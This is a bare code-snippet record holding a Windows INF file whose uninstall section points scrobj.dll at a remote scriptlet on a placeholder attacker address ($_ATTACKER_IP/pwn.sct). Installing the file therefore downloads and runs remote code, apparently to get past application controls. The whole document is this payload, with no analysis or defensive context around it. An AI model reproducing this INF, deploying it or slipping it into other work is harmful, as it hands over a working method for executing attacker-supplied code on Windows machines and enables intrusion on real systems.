---
id: 78fdbb99-0145-45ce-bcbc-e8a4784b6812
type: code
language: INF File
verified: false
created_at: '2020-04-10T22:17:39.795354+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 78fdbb99

**Language**: INF File

```inf file
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://$_ATTACKER_IP/pwn.sct

[Strings]
AppAct="SOFTWARE\Microsoft\Connection Manager"
ServiceName="Corp"
ShortSvcName="Corp"
```
